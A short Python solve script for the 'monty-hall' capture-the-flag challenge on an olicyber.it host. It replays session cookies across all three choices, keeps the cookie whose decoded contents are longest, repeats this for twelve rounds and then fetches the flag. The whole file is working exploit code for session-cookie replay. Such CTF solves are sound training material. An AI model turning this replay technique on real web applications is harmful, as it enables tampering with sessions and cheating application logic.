#!/usr/bin/env python3
import requests
from base64 import b64decode

URL = "http://monty-hall.challs.olicyber.it/"
cookie = requests.get(URL).cookies['session']
cookie_t = b64decode(cookie)

for i in range(12):
    print(i, cookie, flush=True)
    cookies = []
    for e in range(1, 4):
        s = requests.Session()
        s.cookies.set('session', cookie)
        s.post(URL, data={'choice': e}, allow_redirects=False)
        cookies.append((b64decode(s.cookies.get_dict()['session']), s.cookies.get_dict()['session']))
    
    cookie = max(cookies, key=lambda x: len(x[0]))[1]

flag = requests.get(URL, cookies={'session':cookie}).text
print(flag)